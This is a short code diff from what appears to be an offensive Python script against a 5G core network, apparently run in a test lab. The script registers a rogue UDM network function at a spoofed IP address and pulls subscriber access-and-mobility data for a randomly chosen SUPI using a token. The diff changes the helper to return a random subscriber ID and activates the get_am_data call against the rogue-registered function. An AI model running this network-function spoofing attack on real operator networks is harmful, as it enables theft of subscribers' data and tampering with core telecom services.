@@ -33,7 +33,7 @@ def get_random_supi():
     resStr = result.output.decode()
     supiList = resStr.split("\n")
     supiList = [item for item in supiList if item]
-    print(supiList)
+    return random.choice(supiList)
 
 
 # ---------------------------------------------------------------------------- #
@@ -195,7 +195,8 @@ def spoof_udm_and_restore(spoofed_ip):
     print(f"[+] Rogue UDM added at {spoofed_ip} with id {rogue_instance_id}")
 
     # ----------- The attack you want here (get_am_data / sm_data etc) ----------- #
-    # get_am_data()
+
+    get_am_data(supi=get_random_supi(), token=token, mcc="208", mnc="93")
 
     add_nf(
         real_nf_instanceId, "UDM", real_services, ip_address=real_nf_ip, display=False
